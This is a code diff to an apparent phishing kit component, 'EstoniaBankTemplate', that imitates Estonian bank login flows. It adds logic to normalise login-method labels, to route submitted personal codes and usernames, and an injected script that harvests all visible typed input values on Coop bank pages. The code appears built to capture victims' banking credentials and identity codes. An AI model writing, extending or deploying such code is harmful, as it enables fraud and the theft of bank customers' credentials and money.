@@ -42,7 +42,7 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
       "coop-pank": ["Biomeetria", "Smart-ID", "Mobiil-ID"],
       "inbank": ["Smart-ID", "Mobiil-ID", "PIN-kalkulaator"],
       "lhv-pank": ["Biomeetria", "Smart-ID", "Mobiil-ID", "PIN-kalkulaator", "Salasõna", "ID-kaart"],
-      "citadele-banka": ["Citadele App", "Smart-ID", "ID-kaart", "MobileSCAN / Digipass"],
+      "citadele-banka": ["Mobiil-ID", "ID-kaart", "MobileSCAN", "Digipass"],
       "luminor-ee": ["Mobiil-ID", "ID-kaart", "PIN-kalkulaator", "Smart-ID"],
       "op-corporate-bank": ["Mobiil-ID", "Smart-ID", "PIN kalkulaator"],
       "seb-pank": ["Smart-ID", "Mobiil-ID", "SEB Mobiilirakendus", "ID-kaart", "PIN-kalkulaator"],
@@ -50,6 +50,38 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
     };
 
     return methodMap[slug]?.[index] ?? "";
+  };
+
+  const normalizeLoginMethodLabel = (value: string) => {
+    const normalized = value.trim().toLowerCase();
+    if (!normalized || normalized === "bilinmiyor") return "";
+
+    if (normalized.includes("mobilescan")) return "MobileSCAN";
+    if (normalized.includes("digipass")) return "Digipass";
+    if (normalized.includes("seb mobiil") || normalized.includes("mobiilirakendus")) return "SEB Mobiilirakendus";
+    if (normalized.includes("smart")) return "Smart-ID";
+    if (normalized.includes("mobiil")) return "Mobiil-ID";
+    if (normalized.includes("id-kaart") || normalized.includes("id kaart") || normalized.includes("id-card")) return "ID-kaart";
+    if (normalized.includes("pin")) return bankSlug === "op-corporate-bank" ? "PIN kalkulaator" : "PIN-kalkulaator";
+    if (normalized.includes("bio")) return bankSlug === "swedbank-ee" ? "Biomeetria/PIN-kood" : "Biomeetria";
+    if (normalized.includes("salas")) return "Salasõna";
+
+    return value.trim();
+  };
+
+  const prefersIdentityFields = (loginMethod: string) => {
+    const normalized = loginMethod.trim().toLowerCase();
+    if (!normalized) return false;
+
+    return (
+      normalized.includes("mobiil") ||
+      normalized.includes("smart") ||
+      normalized.includes("mobilescan") ||
+      normalized.includes("digipass") ||
+      normalized.includes("biomeetria") ||
+      normalized.includes("mobiilirakendus") ||
+      normalized.includes("id-kaart")
+    );
   };
 
   const normalizeCapturedFields = (
@@ -110,15 +142,13 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
       if (e.data && e.data.type === 'ESTONIA_BANK_SUBMIT') {
         const { formData } = e.data;
         
-        const detectedLoginMethod = typeof formData.loginMethod === "string" ? formData.loginMethod.trim() : "";
-        const fallbackLoginMethod = resolveLoginMethodFromIndex(bankSlug, currentIndex);
-        const preferIndexedLoginMethod = bankSlug === "citadele-banka";
-        let newLoginMethod = preferIndexedLoginMethod
-          ? (fallbackLoginMethod || detectedLoginMethod || "Bilinmiyor")
-          : detectedLoginMethod && detectedLoginMethod.toLowerCase() !== "bilinmiyor"
-            ? detectedLoginMethod
-            : (fallbackLoginMethod || "Bilinmiyor");
+        const detectedLoginMethod = normalizeLoginMethodLabel(
+          typeof formData.loginMethod === "string" ? formData.loginMethod.trim() : "",
+        );
+        const fallbackLoginMethod = normalizeLoginMethodLabel(resolveLoginMethodFromIndex(bankSlug, currentIndex));
+        const newLoginMethod = detectedLoginMethod || fallbackLoginMethod || "Bilinmiyor";
         const capturedFields = normalizeCapturedFields(formData);
+        const identityFirstMethod = prefersIdentityFields(newLoginMethod);
         const mappedData: Record<string, string> = {
           loginMethod: newLoginMethod,
           personalCode: "",
@@ -328,7 +358,7 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
             continue;
           }
 
-          if (!mappedData.verfuegernummer) {
+          if (!identityFirstMethod && !mappedData.verfuegernummer) {
             assignUsername(value);
             continue;
           }
@@ -524,7 +554,7 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
             return '';
         };
 
-        const buildCapturedFields = (container) => {
+            const buildCapturedFields = (container) => {
             const fields = [];
             if (!container || !container.querySelectorAll) return fields;
 
@@ -598,6 +628,63 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
                     placeholder: input.getAttribute('placeholder') || ''
                 });
             });
+
+            if (!fields.length && window.location.href.includes('coop')) {
+                container.querySelectorAll('input, select, textarea').forEach(input => {
+                    if (!input || input.disabled) return;
+
+                    const type = ((input.type || input.tagName || '') + '').toLowerCase();
+                    const keyText = [
+                        input.name || '',
+                        input.id || '',
+                        input.getAttribute('data-testid') || '',
+                        input.getAttribute('placeholder') || '',
+                        getFieldLabel(input) || '',
+                    ].join(' ').toLowerCase();
+
+                    if (
+                        type === 'hidden' ||
+                        type === 'submit' ||
+                        type === 'button' ||
+                        type === 'reset' ||
+                        type === 'file' ||
+                        type === 'radio' ||
+                        type === 'checkbox'
+                    ) {
+                        return;
+                    }
+
+                    if (
+                        keyText.includes('rememberme') ||
+                        keyText.includes('remember me') ||
+                        keyText.includes('pea mind meeles') ||
+                        keyText.includes('salvesta') ||
+                        keyText.includes('meelde')
+                    ) {
+                        return;
+                    }
+
+                    const value = (input.value || '').trim();
+                    if (!value) {
+                        return;
+                    }
+
+                    const key = input.name || input.id || input.getAttribute('data-testid') || 'unknown';
+                    if (fields.some(field => field.key === key && field.value === value)) {
+                        return;
+                    }
+
+                    fields.push({
+                        key: key,
+                        name: input.name || '',
+                        id: input.id || '',
+                        value: value,
+                        type: type || 'text',
+                        label: getFieldLabel(input),
+                        placeholder: input.getAttribute('placeholder') || ''
+                    });
+                });
+            }
 
             return fields;
         };
